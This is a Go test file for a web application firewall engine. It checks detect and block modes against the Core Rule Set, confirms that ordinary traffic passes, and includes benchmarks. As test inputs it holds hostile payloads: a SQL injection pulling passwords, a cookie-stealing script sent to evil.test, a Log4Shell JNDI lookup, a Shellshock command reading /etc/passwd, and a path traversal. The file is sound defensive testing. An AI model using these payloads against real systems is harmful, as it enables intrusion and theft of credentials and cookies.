// SPDX-License-Identifier: Apache-2.0

package waf

import (
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
)

var (
	engines   = map[Mode]*Engine{}
	enginesMu sync.Mutex
)

// engine builds the rule set once per mode for the whole package: a build
// reads every Core Rule Set file.
func engine(t testing.TB, mode Mode) *Engine {
	t.Helper()
	enginesMu.Lock()
	defer enginesMu.Unlock()
	if e := engines[mode]; e != nil {
		return e
	}
	e := New()
	if err := e.Configure(mode, 1); err != nil {
		t.Fatal(err)
	}
	engines[mode] = e
	return e
}

func get(target string) *http.Request {
	r := httptest.NewRequest(http.MethodGet, target, nil)
	r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36")
	r.Header.Set("Accept", "text/html")
	return r
}

func form(target string, v url.Values) *http.Request {
	r := httptest.NewRequest(http.MethodPost, target, strings.NewReader(v.Encode()))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36")
	r.Header.Set("Accept", "text/html")
	return r
}

func matchedSince(e *Engine, before int64) bool {
	_, m, _ := e.Counts()
	return m > before
}

// A SQL injection in the query is recorded in detect mode, with the Core
// Rule Set's SQL rule, and refused only in block mode.
func TestASQLInjectionIsRecordedAndRefusedOnlyInBlockMode(t *testing.T) {
	attack := "/search?q=" + url.QueryEscape("1' UNION SELECT username, password FROM users--")
	d := engine(t, ModeDetect)
	if d.Inspect(get(attack), "203.0.113.5") {
		t.Fatal("detect mode refused a request")
	}
	found := false
	for _, m := range d.Recent() {
		if m.Path == "/search" && m.RuleID >= 942000 && m.RuleID < 943000 && m.Refused {
			found = true
		}
	}
	if !found {
		t.Fatalf("the injection was not recorded as a SQL rule reaching the threshold: %+v", d.Recent())
	}
	if !engine(t, ModeBlock).Inspect(get(attack), "203.0.113.5") {
		t.Fatal("block mode served a SQL injection")
	}
}

// Cross-site scripting in a form body is read and caught, and the body the
// app then reads is the one that was sent.
func TestScriptInAFormBodyIsCaughtAndTheBodyIsHandedBack(t *testing.T) {
	b := engine(t, ModeBlock)
	v := url.Values{"name": {"Reader"}, "comment": {`<script>document.location='https://evil.test/?c='+document.cookie</script>`}}
	r := form("/comments", v)
	if !b.Inspect(r, "203.0.113.6") {
		t.Fatal("script in a form body was served in block mode")
	}
	d := engine(t, ModeDetect)
	r = form("/comments", v)
	d.Inspect(r, "203.0.113.6")
	got, _ := io.ReadAll(r.Body)
	if string(got) != v.Encode() {
		t.Fatalf("the app read %q, not the body sent", got)
	}
}

// What readers send matches no rule: a page, a search, a sign-in link, a
// comment with ordinary punctuation, a JSON beacon.
func TestOrdinaryTrafficMatchesNothing(t *testing.T) {
	e := engine(t, ModeBlock)
	_, before, _ := e.Counts()
	reqs := []*http.Request{
		get("/a-post-about-gardening"),
		get("/search?q=" + url.QueryEscape("best roses for a north-facing wall")),
		get("/tag/travel?page=2"),
		form("/members/login", url.Values{"email": {"reader@example.com"}}),
		form("/comments", url.Values{"name": {"Asha"}, "comment": {"Lovely post — thanks! I tried this last year (in May) and it worked; 10/10 would recommend."}}),
	}
	j := httptest.NewRequest(http.MethodPost, "/api/collect", strings.NewReader(`{"path":"/a-post","ref":"https://news.example/"}`))
	j.Header.Set("Content-Type", "application/json")
	j.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0")
	j.Header.Set("Accept", "*/*")
	reqs = append(reqs, j)
	for _, r := range reqs {
		if e.Inspect(r, "203.0.113.7") {
			t.Errorf("an ordinary request was refused: %s %s", r.Method, r.URL)
		}
	}
	if matchedSince(e, before) {
		t.Errorf("ordinary traffic matched rules: %+v", e.Recent()[:1])
	}
}

// Off inspects nothing and refuses nothing.
func TestOffInspectsNothing(t *testing.T) {
	e := New()
	if e.Inspect(get("/search?q="+url.QueryEscape("' OR 1=1--")), "203.0.113.8") {
		t.Fatal("an off firewall refused a request")
	}
	if n, _, _ := e.Counts(); n != 0 {
		t.Fatalf("an off firewall inspected %d requests", n)
	}
}

// A page view with nothing in it is not read; anything with something in it
// is: a query, a traversal, an injection marker in a header.
func TestOnlyARequestWithNothingInItSkipsTheRuleSet(t *testing.T) {
	e := engine(t, ModeBlock)
	if n0, _, _ := e.Counts(); e.Inspect(get("/a-post-about-gardening"), "203.0.113.10") || func() bool { n, _, _ := e.Counts(); return n != n0 }() {
		t.Fatal("a plain page view was read by the rule set")
	}
	log4shell := get("/a-post")
	log4shell.Header.Set("User-Agent", "${jndi:ldap://evil.test/a}")
	shellshock := get("/a-post")
	shellshock.Header.Set("User-Agent", "() { :; }; /bin/bash -c 'cat /etc/passwd'")
	for name, r := range map[string]*http.Request{
		"traversal":  get("/static/../../etc/passwd"),
		"log4shell":  log4shell,
		"shellshock": shellshock,
	} {
		if !e.Inspect(r, "203.0.113.10") {
			t.Errorf("%s was served in block mode", name)
		}
	}
}

// BenchmarkAnOrdinaryPage is the cost the firewall adds to a reader's page
// that has a query, and so is read in full.
func BenchmarkAnOrdinaryPage(b *testing.B) {
	e := engine(b, ModeBlock)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(get("/a-post-about-gardening?ref=home"), "203.0.113.9")
	}
}

// BenchmarkAPlainPageView is the cost for a page view with nothing in it.
func BenchmarkAPlainPageView(b *testing.B) {
	e := engine(b, ModeBlock)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		e.Inspect(get("/a-post-about-gardening"), "203.0.113.9")
	}
}
